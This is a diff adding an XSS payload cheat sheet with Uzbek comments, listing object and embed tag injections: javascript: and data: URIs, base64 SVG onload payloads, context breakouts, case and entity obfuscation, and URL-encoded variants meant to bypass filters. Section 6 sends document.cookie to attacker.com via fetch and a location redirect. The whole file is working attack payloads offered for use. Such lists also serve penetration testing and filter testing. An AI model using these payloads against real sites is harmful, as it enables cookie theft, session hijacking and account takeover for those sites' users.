@@ -1,0 +1,96 @@
+🔥 ULTIMATE OBJECT / EMBED XSS (CLEAN)
+
+⸻
+
+1. CORE (LIMITED ⚠️)
+
+<object data="javascript:alert(1)"></object>
+<object data=javascript:alert(1)></object>
+
+👉 ko‘p browserlarda bloklangan, lekin ba’zi bypasslarda ishlaydi
+
+⸻
+
+2. DATA URI (ENG MUHIM)
+
+<object data="data:text/html,<script>alert(1)</script>"></object>
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+
+
+⸻
+
+3. SVG PAYLOAD (POWERFUL)
+
+<object data="data:image/svg+xml,<svg onload=alert(1)>"></object>
+<object data="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+"></object>
+
+
+⸻
+
+4. EMBED + SVG
+
+<embed src="data:image/svg+xml,<svg onload=alert(1)>">
+<embed src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">
+
+
+⸻
+
+5. PARAM INJECTION
+
+<object>
+<param name="src" value="javascript:alert(1)">
+</object>
+
+
+⸻
+
+6. DATA EXFILTRATION
+
+<object data="javascript:fetch('//attacker.com?c='+document.cookie)"></object>
+<object data="javascript:location='//attacker.com?c='+document.cookie"></object>
+
+
+⸻
+
+7. CONTEXT BREAKOUT
+
+"><object data="javascript:alert(1)">
+'><object data="data:text/html,<script>alert(1)</script>">
+
+
+⸻
+
+8. OBFUSCATION
+
+<object data="jAvAsCrIpT:alert(1)"></object>
+<object data="javascript&colon;alert(1)"></object>
+<object data="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)"></object>
+
+
+⸻
+
+9. POLYGLOT
+
+</title><object data="javascript:alert(1)">
+
+
+⸻
+
+10. ENCODED
+
+%3Cobject%20data%3Djavascript%3Aalert(1)%3E
+
+
+⸻
+
+11. ADVANCED JS EXECUTION
+
+<object data="javascript:eval('alert(1)')"></object>
+<object data="javascript:setTimeout(alert,0,1)"></object>
+
+
+⸻
+
+12. HYBRID (HTML CHAIN)
+
+<object data="data:text/html,<svg onload=alert(1)>"></object>
